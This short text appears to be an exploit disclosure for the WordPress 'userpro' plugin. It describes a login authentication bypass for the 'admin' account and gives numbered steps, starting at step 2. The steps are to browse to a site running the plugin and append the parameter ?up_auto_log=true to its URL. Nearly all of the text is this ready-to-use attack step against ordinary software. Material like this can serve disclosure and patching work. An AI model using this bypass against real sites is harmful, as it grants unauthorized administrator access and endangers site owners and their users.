Description
================================================================================
 The userpro plugin has the ability to bypass login authentication for the user
 'admin'. If the site does not use the standard username 'admin' it is not affected.

2 - Browse to a site that has the userpro plugin installed.

3 - Append ?up_auto_log=true to the target: http://www.targetsite.com/?up_auto_log=true
